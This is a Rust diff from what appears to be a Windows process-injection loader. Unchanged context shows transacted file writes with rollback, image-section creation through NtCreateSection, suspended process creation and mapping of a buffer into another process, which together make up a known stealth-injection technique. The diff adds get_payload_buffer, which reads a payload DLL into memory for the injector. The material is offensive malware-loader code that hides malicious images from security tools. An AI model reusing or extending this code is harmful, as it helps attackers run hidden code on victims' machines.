@@ -2,17 +2,18 @@
 
 extern crate alloc;
 
+use alloc::vec::Vec;
 use core::ffi::c_void;
 use core::mem::zeroed;
-use core::ptr::null_mut;
+use core::ptr::{copy_nonoverlapping, null_mut};
 use ntapi::ntmmapi::{NtCreateSection, NtMapViewOfSection, ViewShare};
 use utils::WideString;
 use winapi::um::winbase::{CREATE_NO_WINDOW, DETACHED_PROCESS};
 use windows_sys::core::{PCWSTR, PWSTR};
 use windows_sys::Win32::Foundation::{CloseHandle, BOOL, FALSE, GENERIC_READ, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE, STATUS_IMAGE_NOT_AT_BASE, STATUS_SUCCESS};
 use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
-use windows_sys::Win32::Storage::FileSystem::{CreateFileTransactedW, CreateTransaction, RollbackTransaction, WriteFile, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL};
-use windows_sys::Win32::System::Memory::{PAGE_READONLY, SECTION_ALL_ACCESS, SEC_IMAGE};
+use windows_sys::Win32::Storage::FileSystem::{CreateFileTransactedW, CreateFileW, CreateTransaction, GetFileSize, RollbackTransaction, WriteFile, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, OPEN_EXISTING};
+use windows_sys::Win32::System::Memory::{CreateFileMappingW, MapViewOfFile, UnmapViewOfFile, FILE_MAP_READ, PAGE_READONLY, SECTION_ALL_ACCESS, SEC_IMAGE};
 use windows_sys::Win32::System::Threading::{CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOW};
 
 macro_rules! module_function {
@@ -224,4 +225,79 @@ pub fn map_buffer_into_process(process: HANDLE, section: HANDLE) -> Option<HANDL
     }
 
     Some(section_base_address)
+}
+
+pub fn get_payload_buffer<S>(filename: S) -> Option<Vec<u8>>
+where
+    S: AsRef<str>
+{
+    let filename = filename.as_ref().to_wide();
+    let file = unsafe {
+        CreateFileW(
+            filename.as_ptr(),
+            GENERIC_READ,
+            FILE_SHARE_READ,
+            null_mut(),
+            OPEN_EXISTING,
+            FILE_ATTRIBUTE_NORMAL,
+            null_mut(),
+        )
+    };
+
+    let mapping = unsafe {
+        CreateFileMappingW(
+            file,
+            null_mut(),
+            PAGE_READONLY,
+            0,
+            0,
+            null_mut()
+        )
+    };
+
+    if mapping == null_mut() {
+        unsafe {
+            CloseHandle(file)
+        };
+
+        return None;
+    }
+
+    let dll_data = unsafe {
+        MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0)
+    };
+
+    let dll_raw_data = dll_data.Value as *mut u8;
+
+    if dll_raw_data.is_null() {
+        unsafe {
+            CloseHandle(mapping);
+            CloseHandle(file);
+        }
+
+        return None;
+    }
+
+    let payload_size = unsafe {
+        GetFileSize(file, null_mut())
+    } as usize;
+
+    let mut buffer = Vec::with_capacity(payload_size);
+    unsafe { buffer.set_len(payload_size) };
+
+    unsafe {
+        copy_nonoverlapping(
+            dll_raw_data,
+            buffer.as_mut_ptr(),
+            payload_size
+        );
+    }
+
+    unsafe {
+        UnmapViewOfFile(dll_data);
+        CloseHandle(mapping);
+        CloseHandle(file);
+    }
+
+    Some(buffer)
 }
